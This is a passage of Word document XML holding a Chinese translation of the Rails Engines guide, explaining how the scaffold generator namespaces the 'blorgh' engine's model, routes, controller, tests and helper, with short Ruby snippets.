          </w:p>
          <w:p w14:paraId="583175D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css</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C82FA6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app/assets/stylesheets/blorgh/posts.css</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47CDCCF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css</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D3DD1F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app/assets/stylesheets/scaffold.css</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="073DDEB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脚手架创建器做的第一件事是调用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>active_record</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 创建器，其为 ‘resource’ 创建一个迁移和一个模型。这里要注意，无论如何，迁移被称为 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>create_blorgh_posts</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 而不是一般的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>create_posts</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。这是因为</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>isolate_namespace</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Blorgh::Engine</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 类的定义中被调用。这里的 ‘model’ 也被名称空间化了，被放在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/models/blorgh/post.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 而不是 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/models/post.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 因为 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>isolate_namespace</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 在</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Engine</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 类中被调用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B96F50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接下来， </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>test_unit</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 创建器被这个 ‘model’ 调用，在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>test/unit/blorgh/post_test.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (而不是 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>test/unit/post_test.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">)创建一个单元测试以及一个 ‘fixture’ 在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>test/fixtures/blorgh/posts.yml</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (而不是 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>test/fixtures/posts.yml</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19436E8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在那之后，与资源相应的一行被插入到这个 engine的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/routes.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件中。这行是简单的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>resources :posts</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，转到 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/routes.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 给这个 engine 输入：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3480"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="3105A194" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4AF5030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Blorgh::Engine.routes.draw do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3482A57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resources :posts</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1311E83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4014755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b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">这里注意 ‘routes’ 是 ‘drawn’ 在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Blorgh::Engine</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 上面而不是 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>YourApp::Application</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">这也是 engine ‘routes’ 仅限于 engine 自身并且可以被挂载在一个指定的点上正如 </w:t>
      </w:r>
      <w:hyperlink r:id="rId998" w:anchor="test-directory" w:history="1">
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>test directory</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 部分显示。这里也会使得 engine 的 ‘route’ 于应用程序的其他 ‘routes’ 分割。这会在后面的 </w:t>
      </w:r>
      <w:hyperlink r:id="rId999" w:anchor="routes" w:history="1">
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Routes</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 被讨论。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BE59A5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接下来，</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>scaffold_controller</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 创建器被调用，创建一个名为 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Blorgh::PostsController</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/controllers/blorgh/posts_controller.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">)的控制器并且他的相关的视图在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/blorgh/posts</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。这个创建器也为控制器创建一个功能测试(</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>test/functional/blorgh/posts_controller_test.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)以及一个 ’helper ’ (</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/helpers/blorgh/posts_controller.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="625FB7E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这个创建器创建的任何事物都有整洁的名称空间。控制器的类被定义在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Blorgh</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 模块中。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5880"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="481CD5DF" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0D1E015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module</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>Blorgh</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="53262ED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class</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>PostsController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7ADFA57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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70DC1C1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472DEE5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15459F2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ApplicationController</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 类继承至 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Blorgh::ApplicationController</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，不是一个应用程序的</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ApplicationController</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AF8996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app/helpers/blorgh/posts_helper.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中的 ‘helper’ 也被名称空间化的：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2520"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="31EEC3EA" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1E20E6C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module</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>Blorgh</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F41E6C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class</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>PostsHelper</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E408BD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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1D41554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6E724C8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2FDEBF0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这里帮助防止和其他也有一个 ‘post’ 资源的 engine 或者应用程序冲突。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F52386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最后，这个资源的两个 ‘assets’ 文件文件被创建，</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
